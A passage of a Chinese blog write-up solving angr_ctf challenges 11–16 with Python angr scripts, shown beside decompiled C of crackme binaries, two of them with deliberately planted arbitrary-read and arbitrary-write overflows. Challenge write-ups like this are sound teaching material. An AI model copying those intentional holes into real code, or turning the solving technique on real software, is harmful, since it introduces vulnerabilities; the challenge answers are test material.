<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./11_angr_sim_scanf&quot;</span>)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_good</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_bad</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try again&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.found)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;avoid: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.avoid)))</span><br><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(found_state.posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p><strong>12_angr_veritesting</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(</span><br><span class="line">  (<span class="keyword">int</span>)<span class="string">&quot;%32s&quot;</span>,</span><br><span class="line">  (<span class="keyword">int</span>)v19 + <span class="number">3</span>,</span><br><span class="line">  v5,</span><br><span class="line">  v6,</span><br><span class="line">  v7,</span><br><span class="line">  v8,</span><br><span class="line">  v9,</span><br><span class="line">  (<span class="keyword">int</span>)v10,</span><br><span class="line">  v11,</span><br><span class="line">  v12,</span><br><span class="line">  v13,</span><br><span class="line">  v14,</span><br><span class="line">  v16,</span><br><span class="line">  v18,</span><br><span class="line">  v19[<span class="number">0</span>],</span><br><span class="line">  v19[<span class="number">1</span>],</span><br><span class="line">  v19[<span class="number">2</span>],</span><br><span class="line">  v19[<span class="number">3</span>],</span><br><span class="line">  v19[<span class="number">4</span>],</span><br><span class="line">  v19[<span class="number">5</span>]);</span><br></pre></td></tr></table></figure>
<p>一样的是针对 scanf 的问题</p>
<p>由于变量过长，需要在构造仿真管理器时添加 <code>veritesting=True</code> 选项</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./12_angr_veritesting&quot;</span>)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line">sm = p.factory.simulation_manager(init_state,veritesting=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_good</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_bad</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try again&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.found)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;avoid: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.avoid)))</span><br><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(found_state.posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p><strong>13_angr_static_binary</strong></p>
<p>这是一个静态的程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  angr file <span class="number">13</span>_angr_static_binary </span><br><span class="line"><span class="number">13</span>_angr_static_binary: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">89</span>d11f111deddc580fac3d22a1f6c352d1883cd5, <span class="keyword">not</span> stripped</span><br></pre></td></tr></table></figure>
<p>angr 在处理静态程序时，会进入到 libc 函数的内部进行分析，有些 libc 函数内部的执行分支很多，路径很长，会浪费大量的时间</p>
<p>我们需要做的工作就是用 hook 函数来替代原本的 libc 函数：</p>
<ul>
<li>当执行二进制文件时，main 函数不是调用的第一段代码，程序会首先调用在 <code>_start</code> 函数中的 <code>__libc_start_main</code> 以启动程序，此函数中发生的初始化</li>
<li>使用 angr 可能需要很长时间，所以你应该用 SimProcedure 替换它</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./13_angr_static_binary&quot;</span>)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line"></span><br><span class="line">printf_addr = <span class="number">0x0804ED40</span></span><br><span class="line">puts_addr = <span class="number">0x0804F350</span></span><br><span class="line">strcmp_addr = <span class="number">0x08048280</span></span><br><span class="line">scanf_addr = <span class="number">0x0804ED80</span> </span><br><span class="line">exit_addr = <span class="number">0x0804E3D0</span></span><br><span class="line">__libc_start_main = <span class="number">0x08048D10</span></span><br><span class="line"></span><br><span class="line">p.hook(printf_addr, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;printf&#x27;</span>]())</span><br><span class="line">p.hook(puts_addr, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;puts&#x27;</span>]())</span><br><span class="line">p.hook(strcmp_addr, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;strcmp&#x27;</span>]())</span><br><span class="line">p.hook(scanf_addr, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;scanf&#x27;</span>]())</span><br><span class="line">p.hook(exit_addr, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;exit&#x27;</span>]())</span><br><span class="line">p.hook(__libc_start_main, angr.SIM_PROCEDURES[<span class="string">&#x27;glibc&#x27;</span>][<span class="string">&#x27;__libc_start_main&#x27;</span>]())</span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_good</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_bad</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try again&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.found)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;avoid: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.avoid)))</span><br><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(found_state.posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p><strong>14_angr_shared_library</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%8s&quot;</span>, s);</span><br><span class="line"><span class="keyword">if</span> ( validate((<span class="keyword">int</span>)s, <span class="number">8</span>) )</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">validate</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> validate(a1, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个 <code>validate</code> 是动态链接库中的函数</li>
<li>执行二进制文件前，需要先将对应的动态链接库添加到 <code>/lib</code> 目录中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp -r lib14_angr_shared_library.so /lib</span><br></pre></td></tr></table></figure>
<p>本题目有一个特点，就是是否输出 <code>Good Job</code> 完全由动态链接库决定，于是我们只需要测试动态链接库</p>
<p>angr 拥有分析动态链接库的能力，但需要在创建项目时指定程序的基地址（随便写一个都行），然后利用 <code>p.factory.call_state</code> 去调用 <code>validate</code>（不需要检查返回，只要程序执行到“通过”时该执行的地址就可以就说明输出 <code>Good Job</code> 了）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">base_addr = <span class="number">0x8000000</span></span><br><span class="line">p = angr.Project(<span class="string">&quot;./lib14_angr_shared_library.so&quot;</span>,load_options=&#123;</span><br><span class="line">    <span class="string">&#x27;main_opts&#x27;</span> : &#123;</span><br><span class="line">        <span class="string">&#x27;custom_base_addr&#x27;</span> : base_addr</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">password_addr = claripy.BVV(<span class="number">0x3000000</span>,<span class="number">32</span>)</span><br><span class="line">password = claripy.BVS(<span class="string">&quot;password&quot;</span>,<span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">validate_addr = base_addr+<span class="number">0x6D7</span></span><br><span class="line"></span><br><span class="line">init_state = p.factory.call_state(validate_addr, password_addr, claripy.BVV(<span class="number">8</span>, <span class="number">32</span>))</span><br><span class="line">init_state.memory.store(password_addr, password)</span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br><span class="line">sm.explore(find=<span class="number">0x783</span>+base_addr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.found)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;avoid: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.avoid)))</span><br><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">answer = found_state.solver.<span class="built_in">eval</span>(password,cast_to=<span class="built_in">bytes</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(answer.decode()))</span><br></pre></td></tr></table></figure>
<p><strong>15_angr_arbitrary_read</strong></p>
<p>这个题目有一点不同：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">16</span>]; <span class="comment">// [esp+Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  s = try_again;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u %20s&quot;</span>, &amp;key, v4);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">0x27DFB7C</span> )</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(try_again);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>输入有4字节的溢出，刚好可以覆盖 <code>s</code>（任意地址读）</li>
</ul>
<p>除了绕过对应的密码检查，还需要调用 <code>memory.load</code> 方法将 <code>puts</code> 的第一个参数提取出来，与 <code>Good Job</code> 字符串所在的地址进行对比</p>
<ul>
<li>注意：本题目还需要把 <code>scanf</code> 给 hook 掉，用于限制输入字符的范围（否则将会返回一个无法编码的字符串）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./15_angr_arbitrary_read&quot;</span>)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mySimPro</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">    format_addr = <span class="number">0x484F4A69</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, format_addr, param0, param1</span>):</span></span><br><span class="line">        password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">        password2 = claripy.BVS(<span class="string">&#x27;password2&#x27;</span>, <span class="number">8</span>*<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> password2.chop(bits=<span class="number">8</span>):</span><br><span class="line">            self.state.add_constraints(char &gt;= <span class="string">&#x27;A&#x27;</span>, char &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">        self.state.memory.store(param0, password1, endness=p.arch.memory_endness)</span><br><span class="line">        self.state.memory.store(param1, password2)</span><br><span class="line">        self.state.<span class="built_in">globals</span>[<span class="string">&#x27;password&#x27;</span>] = (password1, password2)</span><br><span class="line"></span><br><span class="line">scanf_symbol = <span class="string">&#x27;__isoc99_scanf&#x27;</span></span><br><span class="line">p.hook_symbol(scanf_symbol, mySimPro())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_puts</span>(<span class="params">state</span>):</span></span><br><span class="line">    check_param = state.memory.load(state.regs.esp+<span class="number">4</span>,<span class="number">4</span>,endness=p.arch.memory_endness)</span><br><span class="line">    <span class="keyword">if</span> state.se.symbolic(check_param):</span><br><span class="line">        goodjob_addr = <span class="number">0x484F4A47</span></span><br><span class="line">        check_constraint = check_param == goodjob_addr</span><br><span class="line">        state.add_constraints(check_constraint)</span><br><span class="line">        <span class="keyword">if</span> state.satisfiable():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_good</span>(<span class="params">state</span>):</span></span><br><span class="line">    puts_address = <span class="number">0x8048370</span></span><br><span class="line">    <span class="keyword">if</span> state.addr == puts_address:</span><br><span class="line">         <span class="keyword">return</span> check_puts(state)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.found)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;avoid: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.avoid)))</span><br><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">(password1, password2) = found_state.<span class="built_in">globals</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">answer1 = (found_state.solver.<span class="built_in">eval</span>(password1))</span><br><span class="line">answer2 = (found_state.solver.<span class="built_in">eval</span>(password2,cast_to=<span class="built_in">bytes</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(answer1, answer2))</span><br></pre></td></tr></table></figure>
<p><strong>16_angr_arbitrary_write</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">16</span>]; <span class="comment">// [esp+Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  dest = unimportant_buffer;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">strncpy</span>(password_buffer, <span class="string">&quot;PASSWORD&quot;</span>, <span class="number">0xC</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u %20s&quot;</span>, &amp;key, s);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">0xB11403</span> )</span><br><span class="line">    <span class="built_in">strncpy</span>(dest, s, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strncpy</span>(unimportant_buffer, s, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(password_buffer, <span class="string">&quot;NDYNWEUJ&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>和上一个题一样，只不过漏洞换成了任意写</p>
<p>在上一个题目的基础上进行修改，再添加一些检查就好了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./16_angr_arbitrary_write&quot;</span>)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mySimPro</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">    format_addr = <span class="number">0x08048721</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, format_addr, param0, param1</span>):</span></span><br><span class="line">        password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">        password2 = claripy.BVS(<span class="string">&#x27;password2&#x27;</span>, <span class="number">8</span>*<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> password2.chop(bits=<span class="number">8</span>):</span><br><span class="line">            self.state.add_constraints(char &gt;= <span class="string">&#x27;A&#x27;</span>, char &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">        self.state.memory.store(param0, password1, endness=p.arch.memory_endness)</span><br><span class="line">        self.state.memory.store(param1, password2)</span><br><span class="line">        self.state.<span class="built_in">globals</span>[<span class="string">&#x27;password&#x27;</span>] = (password1, password2)</span><br><span class="line"></span><br><span class="line">scanf_symbol = <span class="string">&#x27;__isoc99_scanf&#x27;</span></span><br><span class="line">p.hook_symbol(scanf_symbol, mySimPro())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_strncpy</span>(<span class="params">state</span>):</span></span><br><span class="line">    check_param1 = state.memory.load(state.regs.esp+<span class="number">4</span>,<span class="number">4</span>,endness=p.arch.memory_endness)</span><br><span class="line">    check_param2 = state.memory.load(state.regs.esp+<span class="number">8</span>,<span class="number">4</span>,endness=p.arch.memory_endness)</span><br><span class="line">    check_param3 = state.memory.load(state.regs.esp+<span class="number">12</span>,<span class="number">4</span>,endness=p.arch.memory_endness)</span><br><span class="line">    check_bvs = state.memory.load(check_param2, check_param3)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> state.solver.symbolic(check_bvs) <span class="keyword">and</span> state.solver.symbolic(check_param1):</span><br><span class="line">        target_addr = <span class="number">0x57584344</span></span><br><span class="line">        check_key = <span class="string">&quot;NDYNWEUJ&quot;</span></span><br><span class="line">        check_constraint1 = check_param1 == target_addr</span><br><span class="line">        check_constraint2 = check_bvs[-<span class="number">1</span>:-<span class="number">64</span>] == check_key</span><br><span class="line">        <span class="keyword">if</span> state.satisfiable(extra_constraints=(check_constraint1,check_constraint2)):</span><br><span class="line">            state.add_constraints(check_constraint1,check_constraint2)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_good</span>(<span class="params">state</span>):</span></span><br><span class="line">    strncpy_address = <span class="number">0x08048410</span></span><br><span class="line">    <span class="keyword">if</span> state.addr == strncpy_address:</span><br><span class="line">         <span class="keyword">return</span> check_strncpy(state)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.found)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;avoid: &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(sm.avoid)))</span><br><span class="line">found_state = sm.found[<span 